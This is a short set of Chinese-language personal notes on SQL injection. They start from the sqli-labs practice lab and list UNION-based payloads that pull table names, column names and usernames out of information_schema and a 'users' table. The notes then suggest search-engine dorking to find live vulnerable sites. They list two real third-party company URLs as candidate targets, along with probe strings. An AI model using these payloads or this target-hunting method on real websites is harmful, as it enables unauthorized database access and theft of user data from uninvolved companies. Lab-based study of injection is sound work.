# http://127.0.0.1/sqli-labs/Less-1/?id=1

# 





# 

## --+ == --  注释 :-- 或者--+

## order by 10   按照第10列排序

## union select 1,2,3  判断出几列写几列

#### union 优先执行前面的命令，若前面不显示则前面的值改为-1

#### union select 后根据回显位多少，依据修改

###### database() 数据库名

在括号中 (select group_concat(table_name) from information_schema.tables where table_schema='security')           查看database得到的数据库下的表名字

上行中的 table_name 是查表名, 将其改为 column_name ,将后面的 _schema.tables 改为 _schema.columns ,最后添加一个条件 and table_name='users'

#### 这时候得到了表中的字段名再查看 查看的 users 得到该表中的所有用户名：

(select group_concat(username) from users)

# 可以通过inrul:php?id=12 公司 jp 去web中寻找机会 随机挑选后再url后添加' 查看是否有报错，

> 1. https://www.kstech.com.tw/products_detail.php?id=12 不确定
> 
> 2.  https://www.i-chiun.com.tw/_ch/01_about/01_detail.php?id=1

 

- and 1=2

- order by 10
